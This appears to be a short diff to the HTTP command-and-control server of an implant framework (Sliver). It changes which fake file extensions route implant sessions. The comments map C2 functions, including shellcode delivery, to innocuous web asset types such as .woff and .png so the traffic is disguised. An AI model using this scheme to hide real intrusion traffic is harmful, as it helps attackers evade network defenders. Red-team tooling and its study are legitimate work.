@@ -55,8 +55,6 @@ const (
 	defaultHTTPTimeout = time.Second * 60
 	pollTimeout        = defaultHTTPTimeout - 5
 	sessionCookieName  = "PHPSESSID"
-
-	staticWebDirName = "www"
 )
 
 // HTTPSession - Holds data related to a sliver c2 session
@@ -232,14 +230,14 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	// Procedural C2
 	// ===============
 	// .txt = rsakey
-	// .css = start
+	// .jsp = start
 	// .php = session
 	//  .js = poll
 	// .png = stop
 	// .woff = sliver shellcode
 
 	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
-	router.HandleFunc("/{rpath:.*\\.css$}", s.startSessionHandler).MatcherFunc(filterAgent).Methods(http.MethodGet, http.MethodPost)
+	router.HandleFunc("/{rpath:.*\\.jsp$}", s.startSessionHandler).MatcherFunc(filterAgent).Methods(http.MethodGet, http.MethodPost)
 	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).MatcherFunc(filterAgent).Methods(http.MethodGet, http.MethodPost)
 	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
 	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
